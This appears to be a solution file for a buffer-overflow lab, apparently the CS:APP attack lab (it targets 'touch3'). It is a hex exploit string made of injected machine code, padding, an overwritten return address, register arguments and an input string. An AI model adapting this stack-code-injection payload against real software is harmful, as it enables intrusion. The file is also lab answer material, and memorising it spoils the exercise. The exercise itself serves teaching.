/* Injected Code */
5f /* pop rdi */
5e /* pop rsi */
c3 /* ret */
/* Padding */
00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
/* Return address: Injected Code */
c8 4b 66 55 00 00 00 00
/* Arguments */
50 4c 66 55 00 00 00 00 /* rdi */
59 4c 66 55 00 00 00 00 /* rsi */
/* Return address: touch3 */
3d 19 40 00 00 00 00 00
/* Input string */
31 63 39 33 32 38 33 39 00
/* Input array */
fa 00 f9 00 ff 00 fa 00 00 01 f8 00 2a 01 00 01
